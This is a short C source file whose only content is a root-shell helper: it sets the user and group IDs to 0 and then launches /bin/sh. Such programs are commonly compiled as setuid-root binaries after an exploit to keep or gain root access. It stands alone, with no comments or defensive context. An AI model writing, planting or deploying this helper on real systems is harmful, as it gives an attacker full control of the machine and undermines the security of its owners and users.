#include <sys/types.h>
#include <unistd.h>
#include <stdio.h>

int main() {
	setuid(0);
	setgid(0);
	execl("/bin/sh", "sh", 0);
	return 0;
}